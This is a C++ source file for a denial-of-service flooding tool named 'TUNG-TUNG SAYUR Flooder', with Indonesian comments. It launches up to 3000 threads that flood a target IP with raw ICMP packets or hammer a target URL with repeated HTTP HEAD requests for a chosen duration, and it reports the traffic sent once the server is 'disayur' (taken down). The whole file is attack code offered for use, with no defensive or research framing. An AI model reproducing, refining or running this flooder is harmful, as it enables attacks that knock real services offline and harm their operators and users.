// stx_final.cpp - TUNG-TUNG SAYUR Flooder by @kecee_pyrite x Jungker
#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <atomic>
#include <random>
#include <cstring>
#include <csignal>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sched.h>
#include <fstream>
#include <curl/curl.h> // For HTTP Flood (Layer 7)

#define MAX_THREADS 3000
#define DEFAULT_BURST 50
#define DEFAULT_PAYLOAD_SIZE 1024
#define MAX_TOTAL_PACKETS 1000000000

std::atomic<bool> running(true);
std::atomic<long long> total_sent(0);

// Signal handler untuk menghentikan flood
void stop(int) {
    running = false;
}

// Helper function untuk mencetak banner
void print_banner() {
    std::cout << "=====================================\n";
    std::cout << "        TUNG-TUNG SAYUR FLOODER      \n";
    std::cout << "=====================================\n";
}

// Helper function untuk memeriksa apakah target adalah IP atau URL
bool validate_target(const std::string& target, int layer) {
    if (layer == 3) {
        sockaddr_in sa;
        return inet_pton(AF_INET, target.c_str(), &(sa.sin_addr)) != 0;
    } else if (layer == 7) {
        return target.find("http://") == 0 || target.find("https://") == 0;
    }
    return false;
}

// Helper function untuk mengirim HTTP GET requests (Layer 7)
void http_flood(const std::string& url, int duration) {
    CURL* curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();

    if (curl) {
        auto start_time = std::chrono::steady_clock::now();
        while (running) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
            if (elapsed >= duration || total_sent >= MAX_TOTAL_PACKETS) break;

            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // HEAD request to reduce bandwidth
            res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                ++total_sent;
            } else {
                std::cerr << "[!] HTTP Flood error: " << curl_easy_strerror(res) << "\n";
            }
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

// Helper function untuk mengirim ICMP requests (Layer 3)
void icmp_flood(const std::string& ip, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        std::cerr << "[X] Failed to create raw socket. Run as root.\n";
        return;
    }

    sockaddr_in target{};
    target.sin_family = AF_INET;
    inet_pton(AF_INET, ip.c_str(), &target.sin_addr);

    char packet[64] = {};
    auto start_time = std::chrono::steady_clock::now();
    while (running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
        if (elapsed >= duration || total_sent >= MAX_TOTAL_PACKETS) break;

        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target, sizeof(target));
        ++total_sent;
    }
    close(sock);
}

// Flood dispatcher berdasarkan Layer type
void start_flood_layer(const std::string& target, int duration, int threads, int layer) {
    std::vector<std::thread> workers;
    if (layer == 3) {
        for (int i = 0; i < threads; ++i) {
            workers.emplace_back(icmp_flood, target, duration);
        }
    } else if (layer == 7) {
        for (int i = 0; i < threads; ++i) {
            workers.emplace_back(http_flood, target, duration);
        }
    }
    for (auto& t : workers) {
        t.join();
    }
}

// Main entry point untuk Layer 3-7 Floods
void start_flood(const std::string& target, int port, int duration, int threads, int layer) {
    print_banner();
    if (!validate_target(target, layer)) {
        std::cerr << "[X] Invalid target. Use a valid IP for Layer 3 or a valid URL for Layer 7.\n";
        return;
    }

    std::cout << "\n[!] Validation: stx OK\n";
    std::cout << "[*] Flood Target  : " << target << " | Threads: " << threads << "\n\n";

    signal(SIGINT, stop);
    start_flood_layer(target, duration, threads, layer);

    double total_gb = (total_sent * DEFAULT_PAYLOAD_SIZE) / (1024.0 * 1024 * 1024);
    std::cout << "\n[+] Total packets sent : " << total_sent.load() << "\n";
    std::cout << "[+] Estimated data sent: " << total_gb << " GB\n";
    std::cout << "\n[✓] Flood completed successfully. Server disayur.\n";
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <target> <duration> <threads> <layer>\n";
        return 1;
    }

    std::string target = argv[1];
    int duration = std::stoi(argv[2]);
    int threads = std::min(std::stoi(argv[3]), MAX_THREADS);
    int layer = std::stoi(argv[4]); // Layer 3 or 7

    if (layer != 3 && layer != 7) {
        std::cerr << "[X] Invalid layer. Use 3 (Network Layer) or 7 (Application Layer).\n";
        return 1;
    }

    start_flood(target, 0, duration, threads, layer);
    return 0;
}
